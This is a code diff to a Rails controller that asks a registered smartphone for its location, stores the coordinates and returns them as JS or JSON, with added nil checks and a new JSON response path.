@@ -13,23 +13,27 @@ class GeoLocationsController < InheritedResources::Base
       pending_command = send_command_and_wait(@smartphone, 'get_location', {}, timeout: 30.seconds)
       
       if pending_command.completed?
-        location_data = pending_command.response_data
+        raw = pending_command.response_data
+        # Extract location from nested payload if present
+        location_data = raw['payload'] || raw
         
         latitude = location_data['latitude']
         longitude = location_data['longitude']
         accuracy = location_data['accuracy']
         
-        # Save to database
-        GeoLocation.create!(
-          date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
-          lat: latitude,
-          long: longitude,
-          smartphone_id: @smartphone.id
-        )
+        if latitude.present? && longitude.present?
+          # Save to database
+          GeoLocation.create!(
+            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
+            lat: latitude.to_s,
+            long: longitude.to_s,
+            smartphone_id: @smartphone.id
+          )
+        end
         
         commandOutput = ["Location: Lat: #{latitude}, Lon: #{longitude}, Accuracy: #{accuracy}m"]
       else
-        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
+        error_msg = pending_command.response_data&.dig('error') || 'Device did not respond'
         commandOutput = ["Operation Failed: #{error_msg}"]
       end
       
@@ -38,14 +42,29 @@ class GeoLocationsController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
-    respond_to do |format|
-      format.js {
-        render "dump_location", locals: { commandOutput: commandOutput, fileName: @fileName }
+    if want_json?
+      render json: { 
+        output: commandOutput,
+        data: (defined?(location_data) ? location_data : nil)
       }
+    else
+      respond_to do |format|
+        format.js {
+          render "dump_location", locals: { 
+            commandOutput: commandOutput, 
+            fileName: @fileName,
+            location_data: (defined?(location_data) ? location_data : nil)
+          }
+        }
+      end
     end
   end
 
   private
+
+  def want_json?
+    request.format.json? || request.headers['Accept']&.include?('application/json')
+  end
 
   def geo_location_params
     params.require(:geo_location).permit(:date,
